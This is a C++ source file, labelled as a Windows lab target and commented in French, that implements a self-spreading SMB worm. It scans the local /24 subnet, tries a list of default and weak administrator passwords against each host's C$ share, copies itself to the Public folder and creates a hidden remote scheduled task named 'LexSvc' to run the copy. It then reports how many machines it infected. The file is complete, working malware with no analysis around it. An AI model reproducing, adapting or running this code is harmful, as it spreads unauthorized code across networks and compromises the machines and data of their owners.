// language: C++17, file: lex_smb_worm.cpp, target: Windows x64 (lab)
// Worm SMB : sweep /24 + creds faibles, drop + tache planifiee DISTANTE
// Usage: lex_smb_worm.exe [mot_de_passe]
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <thread>
#include <vector>
#include <atomic>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")

static std::atomic<int> g_next{1}, g_hits{0};
static const char* g_pass = NULL;

static std::string LocalPrefix() {
    char host[256] = {0};
    if (gethostname(host, 256)) return "192.168.1.";
    addrinfo hints{}; hints.ai_family = AF_INET;
    addrinfo* res = nullptr;
    if (getaddrinfo(host, NULL, &hints, &res) || !res) return "192.168.1.";
    char ip[64]; inet_ntop(AF_INET, &((sockaddr_in*)res->ai_addr)->sin_addr, ip, 64);
    freeaddrinfo(res);
    int dots = 0; std::string out;
    for (const char* p = ip; *p; p++) { out += *p; if (*p == '.' && ++dots == 3) break; }
    return out;
}

static bool TryHost(const std::string& ip, const char* user, const char* pass) {
    char self[MAX_PATH]; GetModuleFileNameA(NULL, self, MAX_PATH);
    char remote[64]; snprintf(remote, sizeof(remote), "\\\\%s\\C$", ip.c_str());

    NETRESOURCEA nr{}; nr.dwType = RESOURCETYPE_DISK; nr.lpRemoteName = remote;
    if (WNetAddConnection2A(&nr, pass, user, 0) != NO_ERROR) return false;

    char dst[128]; snprintf(dst, sizeof(dst), "\\\\%s\\C$\\Users\\Public\\lex.exe", ip.c_str());
    bool ok = CopyFileA(self, dst, FALSE) != 0;
    if (ok) {
        // tache planifiee DISTANTE : execution demain 3h13
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "schtasks /create /s \\\\%s /ru %s /rp %s /tn \"LexSvc\" /sc once /st 03:13 "
            "/tr \"C:\\Users\\Public\\lex.exe\"", ip.c_str(), user, pass);
        STARTUPINFOA si{}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    WNetCancelConnection2A(remote, 0, TRUE);
    return ok;
}

static void Worker() {
    std::string prefix = LocalPrefix();
    const char* users[] = {"Administrator", "admin", NULL};
    const char* passes[] = {"", "admin", "password", "1234", "LexCorp2026", g_pass, NULL};
    for (;;) {
        int i = g_next.fetch_add(1);
        if (i > 254) return;
        std::string ip = prefix + std::to_string(i);
        for (int u = 0; users[u]; u++)
            for (int p = 0; passes[p]; p++)
                if (passes[p] && TryHost(ip, users[u], passes[p])) { g_hits++; return; }
    }
}

int main(int argc, char** argv) {
    if (argc > 1) g_pass = argv[1];
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    std::vector<std::thread> pool;
    for (int i = 0; i < 24; i++) pool.emplace_back(Worker);
    for (auto& t : pool) t.join();
    printf("[OK] %d machines infectees\n", g_hits.load());
    WSACleanup();
    return g_hits.load();
}
